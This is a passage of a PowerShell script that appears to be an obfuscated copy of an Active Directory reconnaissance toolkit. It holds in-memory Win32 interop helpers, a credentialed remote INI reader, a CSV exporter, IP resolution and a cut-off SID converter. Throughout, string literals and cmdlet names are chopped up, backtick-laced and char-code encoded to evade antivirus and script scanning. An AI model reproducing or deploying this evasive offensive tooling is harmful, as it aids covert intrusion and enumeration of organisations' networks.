function New-InMemoryModule {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SUseS'+'ho'+'uldPr'+'oc'+'e'+'ssForS'+'ta'+'teChangingF'+'un'+'ctions'), '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [Reflection.Assembly].Assembly.GetType(('Sys'+'tem.AppDoma'+'i'+'n')).GetProperty(('Curre'+'nt'+'D'+'omai'+'n')).GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = &('New'+'-'+'Object') Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, ('Ru'+'n'))
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties[('Par'+'amet'+'e'+'rType'+'s')] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties[('N'+'ative'+'Calling'+'Conv'+'ent'+'io'+'n')] = $NativeCallingConvention }
    if ($Charset) { $Properties[('Cha'+'rset')] = $Charset }
    if ($SetLastError) { $Properties[('SetLas'+'t'+'Error')] = $SetLastError }
    if ($EntryPoint) { $Properties[('E'+'ntr'+'yPoin'+'t')] = $EntryPoint }

    &('New-'+'Obj'+'ect') PSObject -Property $Properties
}


function Add-Win32Type
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,

        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", ('Pub'+'lic'+','+'Befor'+'eFi'+'eldI'+'nit'))
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, ('Public,Be'+'for'+'eFieldIn'+'it'))
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                ('P'+'ubl'+'ic,Static,Pin'+'vo'+'k'+'eI'+'mpl'),
                $ReturnType,
                $ParameterTypes)

            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, ('O'+'ut'), $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField(('Se'+'tLas'+'tErro'+'r'))
            $CallingConventionField = $DllImport.GetField(('CallingC'+'onv'+'entio'+'n'))
            $CharsetField = $DllImport.GetField(('Char'+'S'+'et'))
            $EntryPointField = $DllImport.GetField(('E'+'ntr'+'y'+'Point'))
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($PSBoundParameters[('E'+'ntryPoin'+'t')]) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = &('Ne'+'w-Obje'+'c'+'t') Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum {


    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, ('Publ'+'ic'), $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = &('N'+'e'+'w-O'+'bject') Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{


    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = ('AnsiC'+'l'+'ass,
'+' '+'       '+'C'+'lass,
  '+'   '+'   Publi'+'c,
        '+'Sealed,
 '+'       '+'Befo'+'reF'+'ield'+'Ini'+'t')

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField(('Si'+'zeCons'+'t')))

    $Fields = &('New'+'-'+'O'+'bject') Hashtable[]($StructFields.Count)

    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field][('Posit'+'ion')]
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field[('FieldN'+'ame')]
        $FieldProp = $Field[('Pr'+'op'+'er'+'ties')]

        $Offset = $FieldProp[('Offse'+'t')]
        $Type = $FieldProp[('T'+'ype')]
        $MarshalAs = $FieldProp[('Mars'+'halA'+'s')]

        $NewField = $StructBuilder.DefineField($FieldName, $Type, ('Publi'+'c'))

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = &('New-Obj'+'ec'+'t') Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = &('New-Obj'+'ec'+'t') Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    $SizeMethod = $StructBuilder.DefineMethod(('Get'+'Size'),
        ('Public,'+' '+'S'+'tatic'),
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod(('GetT'+'ype'+'F'+'ro'+'mHa'+'ndle')))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod(('S'+'izeOf'), [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    $ImplicitConverter = $StructBuilder.DefineMethod(('op_'+'Impl'+'icit'),
        ('Pri'+'v'+'ate'+'Scope'+', Public, Stati'+'c, HideByS'+'ig,'+' Speci'+'alN'+'ame'),
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod(('Get'+'TypeFromHan'+'dl'+'e')))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod(('PtrToStr'+'uctur'+'e'), [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}



Function New-DynamicParameter {


    [CmdletBinding(DefaultParameterSetName = {'Dyna'+'micPara'+'meter'})]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = "dY`NAmi`cparaMe`T`eR")]
        [ValidateNotNullOrEmpty()]
        [string]$Name,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "dYnamICpar`A`m`E`TER")]
        [System.Type]$Type = [int],

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DYnA`miCPA`RAMe`TER")]
        [string[]]$Alias,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "dy`N`AMICpaR`AmEtEr")]
        [switch]$Mandatory,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "d`Y`NamIC`PARAmetEr")]
        [int]$Position,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "dy`NAmI`CPAr`AMe`TeR")]
        [string]$HelpMessage,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DynAMi`C`Pa`RameTER")]
        [switch]$DontShow,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "dynA`Mi`CpAram`E`TER")]
        [switch]$ValueFromPipeline,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "dYNa`mICpaR`A`meT`er")]
        [switch]$ValueFromPipelineByPropertyName,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DY`NaM`iCP`ArAmet`Er")]
        [switch]$ValueFromRemainingArguments,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DYN`AmIc`PArAM`eTER")]
        [string]$ParameterSetName = "_`_aLL`P`ArA`MeTer`sETs",

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "dY`NAm`IcpARameTeR")]
        [switch]$AllowNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DYNAM`iC`PA`RAM`e`Ter")]
        [switch]$AllowEmptyString,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DYNaMiCP`A`R`A`Meter")]
        [switch]$AllowEmptyCollection,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "dYnAMicPar`A`Me`TER")]
        [switch]$ValidateNotNull,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DyN`A`miCpAr`AmeTeR")]
        [switch]$ValidateNotNullOrEmpty,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DYNAMicPa`Ram`eT`er")]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "D`yNAmIcP`Ara`Meter")]
        [ValidateCount(2,2)]
        [int[]]$ValidateRange,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DYNAmIcPARA`ME`TEr")]
        [ValidateCount(2,2)]
        [int[]]$ValidateLength,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "D`YnamiC`Pa`Ra`meteR")]
        [ValidateNotNullOrEmpty()]
        [string]$ValidatePattern,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DyNAM`i`CpaR`AMEteR")]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ValidateScript,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "DYnami`CpaR`AM`e`TEr")]
        [ValidateNotNullOrEmpty()]
        [string[]]$ValidateSet,

        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = "dYn`A`micpar`AMe`TER")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw ('D'+'ict'+'i'+'ona'+'ry must be '+'a Sys'+'te'+'m.'+'Manag'+'ement.Au'+'tom'+'ation.RuntimeD'+'efine'+'d'+'P'+'arameterDict'+'ionary objec'+'t')
            }
            $true
        })]
        $Dictionary = $false,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = "CR`eaTev`AriaBLes")]
        [switch]$CreateVariables,

        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = "CRE`At`EvAr`I`Ables")]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if($_.GetType().Name -notmatch ('Diction'+'ar'+'y')) {
                Throw ('Bou'+'ndParamete'+'r'+'s mu'+'s'+'t '+'be '+'a Sy'+'ste'+'m.'+'Managem'+'ent'+'.'+'Au'+'tomat'+'i'+'on.PSBou'+'ndParametersDi'+'c'+'t'+'i'+'ona'+'ry'+' obje'+'ct')
            }
            $true
        })]
        $BoundParameters
    )

    Begin {
        $InternalDictionary = &('Ne'+'w-O'+'bjec'+'t') -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        $CommonParameters = (&('Get-Comm'+'an'+'d') _temp).Parameters.Keys
    }

    Process {
        if($CreateVariables) {
            $BoundKeys = $BoundParameters.Keys | &('Where-'+'O'+'bje'+'ct') { $CommonParameters -notcontains $_ }
            ForEach($Parameter in $BoundKeys) {
                if ($Parameter) {
                    &('Set-'+'Va'+'riable') -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force
                }
            }
        }
        else {
            $StaleKeys = @()
            $StaleKeys = $PSBoundParameters.GetEnumerator() |
                        &('F'+'o'+'rE'+'ach-Obje'+'ct') {
                            if($_.Value.PSobject.Methods.Name -match (('^'+'Eq'+'ualsDi'+'r').rEPLAce('Dir','$'))) {
                                if(!$_.Value.Equals((&('Get-'+'Variabl'+'e') -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (&('Get-Var'+'i'+'ab'+'le') -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if($StaleKeys) {
                $StaleKeys | &('ForE'+'ach-O'+'b'+'j'+'ect') {[void]$PSBoundParameters.Remove($_)}
            }

            $UnboundParameters = (&('Ge'+'t-Comman'+'d') -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        &('Wher'+'e-Obj'+'e'+'ct') { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            &('Sel'+'ect-'+'Object') -ExpandProperty Key |
                                                &('Wher'+'e-O'+'b'+'ject') { $PSBoundParameters.Keys -notcontains $_ }

            $tmp = $null
            ForEach ($Parameter in $UnboundParameters) {
                $DefaultValue = &('G'+'et-'+'Va'+'riable') -Name $Parameter -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue($Parameter, [ref]$tmp) -and $DefaultValue) {
                    $PSBoundParameters.$Parameter = $DefaultValue
                }
            }

            if($Dictionary) {
                $DPDictionary = $Dictionary
            }
            else {
                $DPDictionary = $InternalDictionary
            }

            $GetVar = {&('Get-'+'Va'+'riable') -Name $_ -ValueOnly -Scope 0}

            $AttributeRegex = ((('^(Mandatoryg6'+'EPosi'+'t'+'i'+'ong6EParamet'+'erSetNameg6'+'EDont'+'Showg6E'+'Hel'+'p'+'M'+'e'+'ss'+'a'+'ge'+'g6EVa'+'lueF'+'ro'+'mPipe'+'lineg6'+'EValu'+'eFrom'+'Pipeline'+'ByP'+'ropertyNameg6'+'EValueFro'+'mRema'+'in'+'ingArguments)o'+'nY')-crEplACe ([ChAr]103+[ChAr]54+[ChAr]69),[ChAr]124  -crEplACe ([ChAr]111+[ChAr]110+[ChAr]89),[ChAr]36))
            $ValidationRegex = (('^(All'+'owNull{1}'+'A'+'ll'+'owEmptyS'+'tri'+'n'+'g{1}A'+'l'+'lo'+'wEmptyColl'+'e'+'c'+'t'+'ion{1}Valid'+'ateCount{1}V'+'a'+'lidat'+'eLeng'+'th{1}ValidatePatt'+'ern{'+'1}Valid'+'a'+'teR'+'ange{1'+'}Val'+'idateScr'+'ipt{1}V'+'al'+'idateSet{1}Va'+'l'+'i'+'d'+'ateNo'+'tNull{1}ValidateNotNullOrE'+'mpty){0'+'}')  -F  [CHar]36,[CHar]124)
            $AliasRegex = (('^Alias'+'{0}')  -F  [cHaR]36)
            $ParameterAttribute = &('N'+'ew-O'+'bject') -TypeName System.Management.Automation.ParameterAttribute

            switch -regex ($PSBoundParameters.Keys) {
                $AttributeRegex {
                    Try {
                        $ParameterAttribute.$_ = . $GetVar
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }

            if($DPDictionary.Keys -contains $Name) {
                $DPDictionary.$Name.Attributes.Add($ParameterAttribute)
            }
            else {
                $AttributeCollection = &('N'+'ew-'+'Ob'+'ject') -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    $ValidationRegex {
                        Try {
                            $ParameterOptions = &('Ne'+'w-Ob'+'ject') -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterOptions)
                        }
                        Catch { $_ }
                        continue
                    }
                    $AliasRegex {
                        Try {
                            $ParameterAlias = &('Ne'+'w-Ob'+'ject') -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. $GetVar) -ErrorAction Stop
                            $AttributeCollection.Add($ParameterAlias)
                            continue
                        }
                        Catch { $_ }
                    }
                }
                $AttributeCollection.Add($ParameterAttribute)
                $Parameter = &('New-Obj'+'e'+'ct') -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)
                $DPDictionary.Add($Name, $Parameter)
            }
        }
    }

    End {
        if(!$CreateVariables -and !$Dictionary) {
            $DPDictionary
        }
    }
}


function Get-IniContent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'S'+'hould'+'Pro'+'cess'), '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('F'+'ullNa'+'me'), ('Na'+'me'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $OutputObject
    )

    BEGIN {
        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match (('EOCEOCEOCE'+'O'+'C'+'.'+'*EOCE'+'OC.*').rEpLace('EOC',[StRing][cHaR]92))) -and ($PSBoundParameters[('Cred'+'enti'+'al')])) {
                $HostComputer = (&('Ne'+'w-Obje'+'ct') System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    &('A'+'d'+'d-Remo'+'teConnection') -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            if (&('Tes'+'t-P'+'ath') -Path $TargetPath) {
                if ($PSBoundParameters[('Out'+'putOb'+'ject')]) {
                    $IniObject = &('New-'+'Obj'+'ect') PSObject
                }
                else {
                    $IniObject = @{}
                }
                Switch -Regex -File $TargetPath {
                    (('^{0'+'}'+'[(.+'+'){0'+'}]') -f  [cHAR]92) # Section
                    {
                        $Section = $matches[1].Trim()
                        if ($PSBoundParameters[('Ou'+'tputObj'+'ect')]) {
                            $Section = $Section.Replace(' ', '')
                            $SectionObject = &('N'+'ew-Ob'+'j'+'ect') PSObject
                            $IniObject | &('Add'+'-Me'+'mber') Noteproperty $Section $SectionObject
                        }
                        else {
                            $IniObject[$Section] = @{}
                        }
                        $CommentCount = 0
                    }
                    "^(;.*)$" # Comment
                    {
                        $Value = $matches[1].Trim()
                        $CommentCount = $CommentCount + 1
                        $Name = ('C'+'omm'+'ent') + $CommentCount
                        if ($PSBoundParameters[('Ou'+'tp'+'utObject')]) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | &('Ad'+'d-Mem'+'b'+'er') Noteproperty $Name $Value
                        }
                        else {
                            $IniObject[$Section][$Name] = $Value
                        }
                    }
                    (('(.+?)'+'Y9'+'ps*'+'=(.*)').ReplacE(([ChaR]89+[ChaR]57+[ChaR]112),'\')) # Key
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $Values = $Value.split(',') | &('F'+'orEach-O'+'bject') { $_.Trim() }


                        if ($PSBoundParameters[('Outp'+'u'+'tObject')]) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | &('Add-'+'M'+'em'+'ber') Noteproperty $Name $Values
                        }
                        else {
                            $IniObject[$Section][$Name] = $Values
                        }
                    }
                }
                $IniObject
            }
        }
    }

    END {
        $MappedComputers.Keys | &('R'+'emove'+'-Remote'+'Con'+'n'+'e'+'ction')
    }
}


function Export-PowerBlaCSV {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'Sh'+'ouldP'+'roces'+'s'), '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $Delimiter = ',',

        [Switch]
        $Append
    )

    BEGIN {
        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters[('P'+'ath')])
        $Exists = [System.IO.File]::Exists($OutputPath)

        $Mutex = &('N'+'ew'+'-Obj'+'ect') System.Threading.Mutex $False,('CSVMu'+'tex')
        $Null = $Mutex.WaitOne()

        if ($PSBoundParameters[('Appen'+'d')]) {
            $FileMode = [System.IO.FileMode]::Append
        }
        else {
            $FileMode = [System.IO.FileMode]::Create
            $Exists = $False
        }

        $CSVStream = &('New'+'-'+'O'+'bject') IO.FileStream($OutputPath, $FileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $CSVWriter = &('N'+'ew-O'+'bject') System.IO.StreamWriter($CSVStream)
        $CSVWriter.AutoFlush = $True
    }

    PROCESS {
        ForEach ($Entry in $InputObject) {
            $ObjectCSV = &('Conver'+'tT'+'o'+'-Cs'+'v') -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation

            if (-not $Exists) {
                $ObjectCSV | &('ForE'+'ach'+'-'+'Obj'+'ect') { $CSVWriter.WriteLine($_) }
                $Exists = $True
            }
            else {
                $ObjectCSV[1..($ObjectCSV.Length-1)] | &('F'+'orEa'+'ch-Obj'+'ect') { $CSVWriter.WriteLine($_) }
            }
        }
    }

    END {
        $Mutex.ReleaseMutex()
        $CSVWriter.Dispose()
        $CSVStream.Dispose()
    }
}


function Resolve-IPAddress {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'S'+'houldPr'+'ocess'), '')]
    [OutputType(('Syst'+'em.'+'Managem'+'en'+'t.Aut'+'o'+'m'+'ation.PS'+'Cu'+'s'+'tom'+'Object'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('HostN'+'am'+'e'), ('d'+'nshostn'+'ame'), ('na'+'me'))]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | &('ForE'+'ac'+'h-'+'Object') {
                    if ($_.AddressFamily -eq ('I'+'nte'+'rNetw'+'ork')) {
                        $Out = &('N'+'ew-Obj'+'ect') PSObject
                        $Out | &('Add'+'-Membe'+'r') Noteproperty ('Co'+'mputer'+'N'+'ame') $Computer
                        $Out | &('A'+'d'+'d-Member') Noteproperty ('IPA'+'ddr'+'ess') $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                &('Writ'+'e-V'+'e'+'rbos'+'e') ('[R'+'e'+'s'+'ol'+'v'+'e-IPAddress'+'] '+'Co'+'u'+'ld '+'not'+' '+'resol'+'ve '+"$Computer "+'t'+'o '+'a'+'n '+'IP'+' '+'Add'+'re'+'ss.')
            }
        }
    }
}


function ConvertTo-SID {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSh'+'o'+'uldProcess'), '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('N'+'ame'), ('I'+'dent'+'ity'))]
        [String[]]
        $ObjectName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Do'+'main'+'Con'+'tr'+'oll'+'er'))]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $DomainSearcherArguments = @{}
        if ($PSBoundParameters[('D'+'o'+'main')]) { $DomainSearcherArguments[('Dom'+'a'+'in')] = $Domain }
        if ($PSBoundParameters[('S'+'erve'+'r')]) { $DomainSearcherArguments[('Ser'+'ve'+'r')] = $Server }
        if ($PSBoundParameters[('C'+'rede'+'ntial')]) { $DomainSearcherArguments[('Cr'+'eden'+'tial')] = $Credential }
    }

    PROCESS {
        ForEach ($Object in $ObjectName) {
            $Object = $Object -Replace '/','\'

            if ($PSBoundParameters[('C'+'re'+'d'+'ential')]) {
                $DN = &('Convert-'+'ADN'+'am'+'e') -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                if ($DN) {
